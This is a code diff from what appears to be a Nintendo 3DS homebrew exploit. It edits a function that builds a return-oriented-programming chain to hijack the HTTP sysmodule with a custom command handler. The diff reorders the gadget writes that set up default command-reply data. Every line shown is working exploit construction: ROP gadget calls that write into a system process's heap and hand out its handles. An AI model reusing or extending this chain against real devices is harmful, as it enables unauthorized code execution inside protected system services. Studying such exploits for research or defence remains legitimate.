@@ -1302,16 +1302,6 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 
 	ropgen_memcpy(&ropchain, &ropvaddr, cmdreq_storage, 0, 0x40);
 
-	//Setup the default cmdreply data, for invalid cmdid.
-	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[0] = 0x00000040;
-	ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
-	ropgen_movr1r0(&ropchain, &ropvaddr);
-	ropgen_writeu32(&ropchain, &ropvaddr, 0x00000040, 0, 0);
-
-	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[1] = 0xd900182f;
-	ropgen_movr1r0(&ropchain, &ropvaddr);
-	ropgen_writeu32(&ropchain, &ropvaddr, 0xd900182f, 0, 0);
-
 	//Setup the static buffer in tls. This (probably) doesn't really need to run *every* time this custom cmdhandler runs, but whatever. The original static buffer is too small for use with PS:VerifyRsaSha256. Hence, this custom cmdhandler needs to run at least once before being used as PS:VerifyRsaSha256.
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Setup the first static buffer translate header.
 	ropgen_add_r0ip(&ropchain, &ropvaddr, 0x100-4);
@@ -1326,6 +1316,11 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	/*
 	if(cmdhdr==0x18010082)
 	{
+		cmdreply[0] = 0x18010042;
+		cmdreply[1] = ~1;
+		cmdreply[2] = 0x0;
+		cmdreply[3] = 0x0;
+
 		if(cmdreq[2]!=0x0 && cmdreq[2]!=0x1 && cmdreq[2]!=0x2 && cmdreq[2]!=0x3)//If this wasn't checked the user process could just read/write a handle/whatever anywhere in HTTP-sysmodule memory.
 		{
 			retval = 0xffffffff;
@@ -1337,8 +1332,6 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 			if(cmdreq[1]==1)
 			{
 				cmdreply[3] = *handleptr;
-				cmdreply[0] = 0x18010042;
-				cmdreply[2] = 0x0;
 			}
 			if(cmdreq[1]==2)CloseHandle(handleptr);
 			retval = 0;
@@ -1358,6 +1351,26 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
 
 		//Translate header isn't validated here, but whatever.
+
+		//Setup the default cmdreply data.
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[0] = 0x18010042;
+		ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_writeu32(&ropchain, &ropvaddr, 0x18010042, 0, 0);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[1] = ~1;
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_writeu32(&ropchain, &ropvaddr, ~1, 0, 0);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[2] = 0x0;
+		ropgen_add_r0ip(&ropchain, &ropvaddr, 0x4);
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_writeu32(&ropchain, &ropvaddr, 0x0, 0, 0);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[3] = 0x0;
+		ropgen_add_r0ip(&ropchain, &ropvaddr, 0x8);
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_writeu32(&ropchain, &ropvaddr, 0x0, 0, 0);
 
 		//if(cmdreq[2]!=0x0 && cmdreq[2]!=0x1 && cmdreq[2]!=0x2 && cmdreq[2]!=0x3)<set retval to 0xffffffff and jump over the rest of this ROP>
 		ropgen_ldrr0r1(&ropchain, &ropvaddr, cmdreq_storage+0x8, 1);
@@ -1436,16 +1449,6 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 
 			ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 1);
 			ropgen_strr0r1(&ropchain, &ropvaddr, 0, 1);
-
-			ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[0] = 0x18010042;
-			ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
-			ropgen_movr1r0(&ropchain, &ropvaddr);
-			ropgen_writeu32(&ropchain, &ropvaddr, 0x18010042, 0, 0);
-
-			ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[2] = 0x0;
-			ropgen_add_r0ip(&ropchain, &ropvaddr, 0x4);
-			ropgen_movr1r0(&ropchain, &ropvaddr);
-			ropgen_writeu32(&ropchain, &ropvaddr, 0x0, 0, 0);
 
 		ropgen_checkcond_eqcontinue_nejump(&ropchain0, &ropvaddr0, ropvaddr);
 
